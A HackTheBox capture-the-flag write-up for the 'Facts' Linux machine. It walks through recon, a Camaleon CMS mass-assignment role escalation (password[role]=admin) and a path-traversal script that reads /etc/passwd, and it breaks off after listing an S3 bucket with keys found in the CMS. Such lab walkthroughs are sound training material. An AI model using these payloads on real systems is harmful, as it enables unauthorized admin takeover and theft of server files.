# Facts — HackTheBox

**Difficulty :** Easy
**OS :** Linux
**Date :** 20 April 2026

https://app.hackthebox.com/machines/Facts?sort_by=created_at&sort_type=desc

---

## 1. Recon
```bash
> nmap -sV 10.129.244.96
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-20 11:40 -03
Nmap scan report for 10.129.244.96
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.18 seconds

```

Opening the IP in browser, redirecting to facts.htb (inaccesible because IP isn't in /etc/hosts).

Adding IP into /etc/hosts

```bash
ffuf -u  http://facts.htb/FUZZ -w Documents/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.facts.htb" -fs 154 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb/FUZZ
 :: Wordlist         : FUZZ: /home/guillaume/Documents/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.facts.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 154
________________________________________________

:: Progress: [40/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [40/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [40/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [80/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [120/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [120/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [160/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [160/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [200/5000] :: Job [1/1] :: 273 req/sec :: Duration: [0:00:01] :: Er:: Progress: [240/5000] :: Job [1/1] :: 253 req/sec :: Duration: [0:00:01] :: Er:: Progress: [240/5000] :: Job [1/1] :: 253 req/sec :: Duration: [0:00:01] :: Er:: Progress: [280/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:01] :: Er:: Progress: [320/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:01] :: Er:: Progress: [320/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:01] :: Er:: Progress: [360/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:01] :: Er:: Progress: [360/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:01] :: Er:: Progress: [400/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:02] :: Er:: Progress: [440/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:02] :: Er:: Progress: [440/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:02] :: Er:: Progress: [480/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:02] :: Er:: Progress: [480/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:02] :: Er:: Progress: [520/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:02] :: Er:: Progress: [560/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:02] :: Er:: Progress: [560/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:02] :: Er:: Progress: [600/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:03] :: Er:: Progress: [600/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:03] :: Er:: Progress: [640/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:03] :: Er:: Progress: [680/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:03] :: Er:: Progress: [680/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:03] :: Er:: Progress: [720/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:03] :: Er:: Progress: [760/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:03] :: Er:: Progress: [760/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:03] :: Er:: Progress: [800/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:04] :: Er:: Progress: [800/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:04] :: Er:: Progress: [840/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:04] :: Er:: Progress: [880/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:04] :: Er:: Progress: [880/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:04] :: Er:: Progress: [920/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:04] :: Er:: Progress: [920/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:04] :: Er:: Progress: [960/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:04] :: Er:: Progress: [1000/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:05] :: E:: Progress: [1000/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:05] :: E:: Progress: [1040/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:05] :: E:: Progress: [1040/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:05] :: E:: Progress: [1080/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:05] :: E:: Progress: [1120/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:05] :: E:: Progress: [1120/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:05] :: E:: Progress: [1160/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:05] :: E:: Progress: [1200/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:06] :: E:: Progress: [1200/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:06] :: E:: Progress: [1240/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:06] :: E:: Progress: [1240/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:06] :: E:: Progress: [1280/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:06] :: E:: Progress: [1320/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:06] :: E:: Progress: [1320/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:06] :: E:: Progress: [1360/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:06] :: E:: Progress: [1360/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:07] :: E:: Progress: [1400/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:07] :: E:: Progress: [1440/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:07] :: E:: Progress: [1440/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:07] :: E:: Progress: [1480/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:07] :: E:: Progress: [1480/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:07] :: E:: Progress: [1520/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:07] :: E:: Progress: [1560/5000] :: Job [1/1] :: 264 req/sec :: Duration: [0:00:07] :: E:: Progress: [1600/5000] :: Job [1/1] :: 292 req/sec :: Duration: [0:00:08] :: E:: Progress: [1600/5000] :: Job [1/1] :: 292 req/sec :: Duration: [0:00:08] :: E:: Progress: [1640/5000] :: Job [1/1] :: 278 req/sec :: Duration: [0:00:08] :: E:: Progress: [1680/5000] :: Job [1/1] :: 307 req/sec :: Duration: [0:00:08] :: E:: Progress: [1720/5000] :: Job [1/1] :: 308 req/sec :: Duration: [0:00:08] :: E:: Progress: [1720/5000] :: Job [1/1] :: 308 req/sec :: Duration: [0:00:08] :: E:: Progress: [1760/5000] :: Job [1/1] :: 264 req/sec :: Duration: [0:00:08] :: E:: Progress: [1800/5000] :: Job [1/1] :: 306 req/sec :: Duration: [0:00:08] :: E:: Progress: [1840/5000] :: Job [1/1] :: 305 req/sec :: Duration: [0:00:09] :: E:: Progress: [1840/5000] :: Job [1/1] :: 305 req/sec :: Duration: [0:00:09] :: E:: Progress: [1880/5000] :: Job [1/1] :: 264 req/sec :: Duration: [0:00:09] :: E:: Progress: [1918/5000] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:09] :: E:: Progress: [1918/5000] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:09] :: E:: Progress: [1956/5000] :: Job [1/1] :: 233 req/sec :: Duration: [0:00:09] :: E:: Progress: [1996/5000] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:09] :: E:: Progress: [2036/5000] :: Job [1/1] :: 224 req/sec :: Duration: [0:00:09] :: E:: Progress: [2076/5000] :: Job [1/1] :: 254 req/sec :: Duration: [0:00:10] :: E:: Progress: [2116/5000] :: Job [1/1] :: 280 req/sec :: Duration: [0:00:10] :: E:: Progress: [2156/5000] :: Job [1/1] :: 344 req/sec :: Duration: [0:00:10] :: E:: Progress: [2196/5000] :: Job [1/1] :: 344 req/sec :: Duration: [0:00:10] :: E:: Progress: [2236/5000] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:10] :: E:: Progress: [2276/5000] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:10] :: E:: Progress: [2314/5000] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:10] :: E:: Progress: [2354/5000] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:10] :: E:: Progress: [2394/5000] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:11] :: E:: Progress: [2434/5000] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:11] :: E:: Progress: [2437/5000] :: Job [1/1] :: 301 req/sec :: Duration: [0:00:11] :: E:: Progress: [2476/5000] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:11] :: E:: Progress: [2516/5000] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:11] :: E:: Progress: [2556/5000] :: Job [1/1] :: 344 req/sec :: Duration: [0:00:11] :: E:: Progress: [2596/5000] :: Job [1/1] :: 344 req/sec :: Duration: [0:00:11] :: E:: Progress: [2636/5000] :: Job [1/1] :: 344 req/sec :: Duration: [0:00:11] :: E:: Progress: [2676/5000] :: Job [1/1] :: 337 req/sec :: Duration: [0:00:12] :: E:: Progress: [2716/5000] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:12] :: E:: Progress: [2756/5000] :: Job [1/1] :: 337 req/sec :: Duration: [0:00:12] :: E:: Progress: [2796/5000] :: Job [1/1] :: 336 req/sec :: Duration: [0:00:12] :: E:: Progress: [2834/5000] :: Job [1/1] :: 311 req/sec :: Duration: [0:00:12] :: E:: Progress: [2874/5000] :: Job [1/1] :: 317 req/sec :: Duration: [0:00:12] :: E:: Progress: [2914/5000] :: Job [1/1] :: 317 req/sec :: Duration: [0:00:12] :: E:: Progress: [2954/5000] :: Job [1/1] :: 317 req/sec :: Duration: [0:00:12] :: E:: Progress: [2985/5000] :: Job [1/1] :: 298 req/sec :: Duration: [0:00:13] :: E:: Progress: [2996/5000] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:13] :: E:: Progress: [3036/5000] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:13] :: E:: Progress: [3076/5000] :: Job [1/1] :: 342 req/sec :: Duration: [0:00:13] :: E:: Progress: [3111/5000] :: Job [1/1] :: 282 req/sec :: Duration: [0:00:13] :: E:: Progress: [3146/5000] :: Job [1/1] :: 282 req/sec :: Duration: [0:00:13] :: E:: Progress: [3186/5000] :: Job [1/1] :: 273 req/sec :: Duration: [0:00:13] :: E:: Progress: [3226/5000] :: Job [1/1] :: 273 req/sec :: Duration: [0:00:13] :: E:: Progress: [3266/5000] :: Job [1/1] :: 274 req/sec :: Duration: [0:00:14] :: E:: Progress: [3301/5000] :: Job [1/1] :: 283 req/sec :: Duration: [0:00:14] :: E:: Progress: [3341/5000] :: Job [1/1] :: 283 req/sec :: Duration: [0:00:14] :: E:: Progress: [3379/5000] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:14] :: E:: Progress: [3419/5000] :: Job [1/1] :: 313 req/sec :: Duration: [0:00:14] :: E:: Progress: [3459/5000] :: Job [1/1] :: 313 req/sec :: Duration: [0:00:14] :: E:: Progress: [3499/5000] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:14] :: E:: Progress: [3515/5000] :: Job [1/1] :: 299 req/sec :: Duration: [0:00:14] :: E:: Progress: [3550/5000] :: Job [1/1] :: 302 req/sec :: Duration: [0:00:15] :: E:: Progress: [3586/5000] :: Job [1/1] :: 331 req/sec :: Duration: [0:00:15] :: E:: Progress: [3626/5000] :: Job [1/1] :: 330 req/sec :: Duration: [0:00:15] :: E:: Progress: [3666/5000] :: Job [1/1] :: 330 req/sec :: Duration: [0:00:15] :: E:: Progress: [3706/5000] :: Job [1/1] :: 330 req/sec :: Duration: [0:00:15] :: E:: Progress: [3746/5000] :: Job [1/1] :: 331 req/sec :: Duration: [0:00:15] :: E:: Progress: [3786/5000] :: Job [1/1] :: 331 req/sec :: Duration: [0:00:15] :: E:: Progress: [3826/5000] :: Job [1/1] :: 330 req/sec :: Duration: [0:00:15] :: E:: Progress: [3861/5000] :: Job [1/1] :: 309 req/sec :: Duration: [0:00:16] :: E:: Progress: [3901/5000] :: Job [1/1] :: 308 req/sec :: Duration: [0:00:16] :: E:: Progress: [3939/5000] :: Job [1/1] :: 311 req/sec :: Duration: [0:00:16] :: E:: Progress: [3979/5000] :: Job [1/1] :: 310 req/sec :: Duration: [0:00:16] :: E:: Progress: [3981/5000] :: Job [1/1] :: 308 req/sec :: Duration: [0:00:16] :: E:: Progress: [4021/5000] :: Job [1/1] :: 269 req/sec :: Duration: [0:00:16] :: E:: Progress: [4021/5000] :: Job [1/1] :: 269 req/sec :: Duration: [0:00:16] :: E:: Progress: [4021/5000] :: Job [1/1] :: 269 req/sec :: Duration: [0:00:16] :: E:: Progress: [4061/5000] :: Job [1/1] :: 212 req/sec :: Duration: [0:00:17] :: E:: Progress: [4061/5000] :: Job [1/1] :: 212 req/sec :: Duration: [0:00:17] :: E:: Progress: [4101/5000] :: Job [1/1] :: 198 req/sec :: Duration: [0:00:17] :: E:: Progress: [4141/5000] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:17] :: E:: Progress: [4141/5000] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:17] :: E:: Progress: [4181/5000] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:17] :: E:: Progress: [4181/5000] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:17] :: E:: Progress: [4221/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:17] :: E:: Progress: [4221/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:18] :: E:: Progress: [4221/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:18] :: E:: Progress: [4261/5000] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:18] :: E:: Progress: [4261/5000] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:18] :: E:: Progress: [4301/5000] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:18] :: E:: Progress: [4341/5000] :: Job [1/1] :: 194 req/sec :: Duration: [0:00:18] :: E:: Progress: [4341/5000] :: Job [1/1] :: 194 req/sec :: Duration: [0:00:18] :: E:: Progress: [4379/5000] :: Job [1/1] :: 162 req/sec :: Duration: [0:00:18] :: E:: Progress: [4417/5000] :: Job [1/1] :: 162 req/sec :: Duration: [0:00:19] :: E:: Progress: [4417/5000] :: Job [1/1] :: 162 req/sec :: Duration: [0:00:19] :: E:: Progress: [4455/5000] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:19] :: E:: Progress: [4495/5000] :: Job [1/1] :: 229 req/sec :: Duration: [0:00:19] :: E:: Progress: [4495/5000] :: Job [1/1] :: 229 req/sec :: Duration: [0:00:19] :: E:: Progress: [4535/5000] :: Job [1/1] :: 216 req/sec :: Duration: [0:00:19] :: E:: Progress: [4575/5000] :: Job [1/1] :: 216 req/sec :: Duration: [0:00:19] :: E:: Progress: [4575/5000] :: Job [1/1] :: 216 req/sec :: Duration: [0:00:19] :: E:: Progress: [4615/5000] :: Job [1/1] :: 216 req/sec :: Duration: [0:00:20] :: E:: Progress: [4655/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:20] :: E:: Progress: [4655/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:20] :: E:: Progress: [4695/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:20] :: E:: Progress: [4695/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:20] :: E:: Progress: [4735/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:20] :: E:: Progress: [4775/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:20] :: E:: Progress: [4775/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:20] :: E:: Progress: [4815/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:21] :: E:: Progress: [4815/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:21] :: E:: Progress: [4855/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:21] :: E:: Progress: [4895/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:21] :: E:: Progress: [4895/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:21] :: E:: Progress: [4935/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:21] :: E:: Progress: [4975/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:21] :: E:: Progress: [4975/5000] :: Job [1/1] :: 243 req/sec :: Duration: [0:00:21] :: E:: Progress: [5000/5000] :: Job [1/1] :: 265 req/sec :: Duration: [0:00:22] :: E:: Progress: [5000/5000] :: Job [1/1] :: 225 req/sec :: Duration: [0:00:22] :: Errors: 0 ::

~ >                                                        took 22s at 11:51:27

```

ffuf returned no subdomain.
## 2. Enumeration

```bash
> gobuster dir -t 50 --url  http://facts.htb --wordlist Documents/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                Documents/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.bash_history        (Status: 200) [Size: 11137]
/.htaccess            (Status: 200) [Size: 11125]
/.gitattributes       (Status: 200) [Size: 11140]
/.git                 (Status: 200) [Size: 11110]
/.gitconfig           (Status: 200) [Size: 11128]
/.bashrc              (Status: 200) [Size: 11119]
/.htpasswd            (Status: 200) [Size: 11125]
/.listing             (Status: 200) [Size: 11122]
/.web                 (Status: 200) [Size: 11110]
/.gitignore           (Status: 200) [Size: 11128]
/.svn                 (Status: 200) [Size: 11110]
/.listings            (Status: 200) [Size: 11125]
/.git-rewrite         (Status: 200) [Size: 11134]
/.gitk                (Status: 200) [Size: 11113]
/.mysql_history       (Status: 200) [Size: 11140]
/.git_release         (Status: 200) [Size: 11134]
/.swf                 (Status: 200) [Size: 11110]
/.gitkeep             (Status: 200) [Size: 11122]
/.subversion          (Status: 200) [Size: 11131]
/.gitmodules          (Status: 200) [Size: 11131]
/.ssh                 (Status: 200) [Size: 11110]
/.gitreview           (Status: 200) [Size: 11128]
/.sh_history          (Status: 200) [Size: 11131]
/.history             (Status: 200) [Size: 11122]
/.rhosts              (Status: 200) [Size: 11119]
/.svnignore           (Status: 200) [Size: 11128]
/.hta                 (Status: 200) [Size: 11110]
/.profile             (Status: 200) [Size: 11122]
/.forward             (Status: 200) [Size: 11122]
/.perf                (Status: 200) [Size: 11113]
/.env                 (Status: 200) [Size: 11110]
/.cvsignore           (Status: 200) [Size: 11128]
/.config              (Status: 200) [Size: 11119]
/.cvs                 (Status: 200) [Size: 11110]
/.passwd              (Status: 200) [Size: 11119]
/.cache               (Status: 200) [Size: 11116]
/400                  (Status: 200) [Size: 6685]
/404                  (Status: 200) [Size: 4836]
/500                  (Status: 200) [Size: 7918]
/CVS                  (Status: 200) [Size: 11110]
/_framework/blazor.webassembly.js (Status: 422) [Size: 8380]
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.php            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.cgi            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.pl             (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/ajax                 (Status: 200) [Size: 0]
/cache                (Status: 200) [Size: 11116]
/captcha              (Status: 200) [Size: 4604]
/config               (Status: 200) [Size: 11119]
/cvs                  (Status: 200) [Size: 11110]
/en                   (Status: 200) [Size: 11109]
/env                  (Status: 200) [Size: 11110]
/error                (Status: 500) [Size: 7918]
/forward              (Status: 200) [Size: 11122]
/git                  (Status: 200) [Size: 11110]
/history              (Status: 200) [Size: 11122]
/hta                  (Status: 200) [Size: 11110]
/htpasswd             (Status: 200) [Size: 11125]
/index                (Status: 200) [Size: 11113]
/index.htm            (Status: 200) [Size: 11125]
/index.html           (Status: 200) [Size: 11128]
/index.php            (Status: 200) [Size: 11125]
/listing              (Status: 200) [Size: 11122]
/listings             (Status: 200) [Size: 11125]
/page                 (Status: 200) [Size: 19593]
/passwd               (Status: 200) [Size: 11119]
/perf                 (Status: 200) [Size: 11113]
/post                 (Status: 200) [Size: 11308]
/profile              (Status: 200) [Size: 11122]
/robots.txt           (Status: 200) [Size: 99]
/robots               (Status: 200) [Size: 33]
/rss                  (Status: 200) [Size: 183]
/search               (Status: 200) [Size: 19187]
/sitemap.xml          (Status: 200) [Size: 3508]
/sitemap.gz           (Status: 500) [Size: 7918]
/sitemap              (Status: 200) [Size: 3508]
/ssh                  (Status: 200) [Size: 11110]
/svn                  (Status: 200) [Size: 11110]
/swf                  (Status: 200) [Size: 11110]
/up                   (Status: 200) [Size: 73]
/web                  (Status: 200) [Size: 11110]
/welcome              (Status: 200) [Size: 11966]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================

~ >                        
```

http://facts.htb/admin/login 

We got an admin login panel.

![admin](images/admin.png)

There is an option to register a new account, let's try it.

I created the dummy user cake, after registering, the app successfully tells me that the user has been created. 

![register](images/dummy-user.png)

After logging in, I land into this page.

![admin](images/admin-panel.png)

The page uses camaleon CMS 2.9.0, which is a content management system, like wordpress.

In the account profile, there is the possibility of editing current user info. 

There is a drop-down selection to edit the account's role (client). But it is disabled.


![admin](images/admin-modif.png)

After inspecting the page we can disable the drop-down and select admin as a role.

Sadly this option does not work, after clicking 'update', the app tells that the user has been updated but in reality it is not being updated.

![admin](images/form-admin.png)


![admin](images/role-change.png)

![admin](images/admin-selected.png)

![admin](images/user-updated-but-no-change.png)


![admin](images/burp-trafic.png)
## 3. Exploitation

search CVE for 2.9.0 Camaleon CMS

**Mass Assignment / Privilege Escalation (CVE-2025-2304):** A critical vulnerability in the `updated_ajax` method of the `UsersController` allows an authenticated user to change their role to `admin`. This is done by manipulating the AJAX request to include `password[role]=admin`, allowing a low-privileged user to gain full administrative control.

https://sploitus.com/exploit?id=1017FEE9-A2CD-587D-889D-E056A5FAD264

```markdown
Manual poc for CVE-2025-2304: Camaleon CMS **Version** 2.9.0

Exploitation Steps
1. Log in as a low-privileged user (e.g., "Bob").
2. Intercept the password change using a proxy (e.g Burpsuite, caido and more)
3. Capture the updated_ajax request during a password change.
4. Inject the parameter password[role]=admin into the POST body and forward it (do not do it in the repeater)
5. The server processes the request and updates the user's role in the database.
6. You got privilege escalation
```

Let's execute this manual PoC.

Login as the low privileged user.

Then, intercept the password change using burp suite :

![intercept burp pass](images/intercept-pass-burp.png)

![intercept pass](images/burp-intercepted.png)

Capture the updated_ajax request during the pass change.

Inject the password[role]=admin into the POST body and forward it :

![POST body request](images/POST-body.png)

After forwarding the request, the password has been successfully updated and the password[role]=admin as well.

I am now an administrator in the app.

![POST body request](images/priv-esc.png)

I have a full access to the website and its contents. 

![POST body request](images/dashboard-admin.png)

Since there is a media upload function, I assume there is some kind of exploit that allows me to upload a malicious file to a certain location or in a certain way to access some sensitive data or get a direct access to the machine.

```
**Arbitrary File Write / RCE (GHSL-2024-182 / CVE-2024-46986):** An authenticated attacker can write arbitrary files to the server, leading to Remote Code Execution. This is due to improper sanitization in the `MediaController` upload method, allowing files to be written outside the intended directory, such as `config/initializers/`.

CVE-2024-46986 is a critical arbitrary file write vulnerability affecting **Camaleon CMS** versions prior to 2.8.2. The flaw allows authenticated attackers to write files to arbitrary paths on the file system due to improper input sanitization, enabling them to execute remote code under certain conditions.

- **CVE ID**: CVE-2024-46986
- **Severity**: Critical
- **CVSS Score**: 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
- **EPSS Score**: 86.38%
- **Published**: September 18, 2024
- **Affected Versions**: <= 2.8.2
- **Patched Version**: 2.8.2+
```

This CVE will not work because it has been patched in 2.8.2+ and our version is currently 2.9.0

Tried SSRF via the Upload from URL function :
1. SSRF (Server Side Request Forgery) via l'URL d'upload

![POST body request](images/SSRF-error.png)

I quickly realize this is a dead-end point and there may be an easier solution for this Easy rated machine.

After searching more possible CVE / exploits for Camaleon CMS 2.9, I found this one : 
https://github.com/Goultarde/CVE-2024-46987

 **A Path Traversal vulnerability has been identified in Camaleon CMS versions 2.8.0 to < 2.8.2 (strangely work on 2.9.0 too). It is located in the `download_private_file` method of the `MediaController`. **

Path traversal vulnerability : This vulnerability allows an **authenticated** user to download arbitrary files from the server by manipulating the `file` parameter. If the application runs with elevated privileges or if sensitive files are accessible to the system user running the CMS, this can lead to critical information leakage (configuration files, source code, etc.).

I read `/etc/passwd` via the path traversal vulnerability, which revealed the user `trivia` on the system. This will be useful later to connect via SSH onto the machine.

```bash
> python3 CVE-2024-46987.py -u http://facts.htb --user bob -p bob /etc/passwd    

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

After inspecting the CMS page, I encounter s3 keys in the settings.

![s3 keys](images/aws-s3.png)

The goal now is to connect to this aws bucket to manage files. If we upload a special file there directly and serve it on the website we can maybe gain access to the machine.

These credentials give us access to the s3 bucket. The endpoint located at localhost:54321 points to the s3 service located on the machine.

Now I have to actually connect to the aws s3.

Using this command I am able to visualize the files on the server
```bash
> aws --profile facts s3 ls s3://randomfacts --endpoint-url http://facts.htb:54321
                           PRE thumb/
2025-09-11 14:07:06     446847 animalejected.png
2025-09-11 14:07:06     271210 annefrankasteroid.png
2025-09-11 14:07:06     255778 catsattachment.png
2025-09-11 14:07:05     411597 cuteanimals.png
2025-09-11 14:07:05     177331 darkchocolate.png
2025-09-11 14:07:05     312753 dogscatssmell.png
2025-09-11 14:07:04     922561 dolphinfact.png
2025-09-11 14:07:04      67352 finlandhappiest.png
2025-09-11 14:07:04     388178 firstimpressions.png
2025-09-11 14:07:04     100689 firsttransaction.png
